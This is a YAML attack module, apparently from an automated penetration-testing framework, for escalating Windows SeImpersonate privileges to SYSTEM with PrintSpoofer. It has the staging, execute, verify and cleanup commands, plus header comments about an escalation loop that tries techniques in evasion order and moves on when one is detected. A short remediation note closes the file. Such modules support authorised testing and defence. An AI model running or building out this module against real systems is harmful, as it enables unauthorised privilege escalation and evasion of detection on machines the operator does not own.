# SeImpersonate → SYSTEM via PrintSpoofer (native .exe rung)
#
# Part of the SeImpersonate → SYSTEM delivery ladder (family: seimpersonate).
# The escalate loop fires ladder rungs in evasion-posture order and climbs to
# the next family member when one is caught. This rung: PrintSpoofer.exe staged to
# disk, invoked by cmd.
#
# PrintSpoofer abuses the Print Spooler named pipe — Server 2016–2019, Win10.
technique: T1134.002
name: SeImpersonate → SYSTEM (PrintSpoofer)
tactic: [privilege-escalation]
platform: [windows]
key: seimpersonate:printspoofer
family: seimpersonate
delivery: native-exe
ranking:
  exploitability: high
  safety: config-change
  detection: moderate
detect:
  privilege: [SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege]
execute:
  command: |-
    {{stage}}\PrintSpoofer.exe -c "cmd /c whoami"
  stages:
    - name: PrintSpoofer
      as: '{{stage}}\PrintSpoofer.exe'
cleanup:
  command: |-
    del {{stage}}\PrintSpoofer.exe
verify:
  success: "NT AUTHORITY"
report:
  vector_type: seimpersonate
  description: >
    PrintSpoofer abuses the Print Spooler named pipe — Server 2016–2019, Win10.
    Staged as a native .exe under the operator's Windows staging dir; the
    escalate loop pushes it from the arsenal.
  remediation: >
    Don't grant SeImpersonate to non-tier-0 accounts. Service accounts that
    need it (IIS worker, MSSQL service) should be isolated and monitored;
    Credential Guard + protected process light for tier-0 processes helps
    contain the blast radius.
  refs: [T1134.002, PrintSpoofer]
